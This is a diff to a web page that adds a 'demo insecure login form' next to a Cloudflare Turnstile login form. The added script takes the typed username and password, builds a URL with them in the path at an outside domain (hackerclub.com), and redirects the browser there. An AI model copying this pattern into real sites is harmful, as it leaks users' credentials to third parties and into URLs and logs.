@@ -58,6 +58,15 @@
         <div class="cf-turnstile" data-sitekey="0x4AAAAAAAf0FyMdm_H6AFYJ"></div>
         <button type="submit" value="Submit">Log in</button>
       </form>
+
+      <h2>Demo insecure login form!</h2>
+       <form id="loginForm" method="GET">
+        <input id="username" name="username" type="text" placeholder="username" />
+        <input id="password" name="password" type="password" placeholder="password" />
+         <div class="cf-turnstile" data-sitekey="0x4AAAAAAAf0FyMdm_H6AFYJ"></div>
+        <button type="submit" value="Submit">Log in</button>
+      </form>
+      
     </div>
   </div>
 
@@ -65,6 +74,19 @@
     <p>Original photo <a href="https://unsplash.com/photos/a-close-up-of-a-metal-object-with-numbers-on-it-eNxYF6cexYU" style="color: white;">Unsplash</a></p>
   </footer>
 
+ <script>
+    // JavaScript to dynamically set the form action URL
+    const form = document.getElementById('loginForm');
+    form.onsubmit = function (event) {
+      event.preventDefault(); // Prevent default form submission
+      const username = document.getElementById('username').value;
+      const password = document.getElementById('password').value;
+      const url = `https://www.hackerclub.com/login/${username}-${password}`; // Construct the URL
+      window.location.href = url; // Redirect to the constructed URL
+    };
+  </script>
+
+  
   <script src="https://challenges.cloudflare.com/turnstile/v0/api.js" defer></script>
 </body>
 
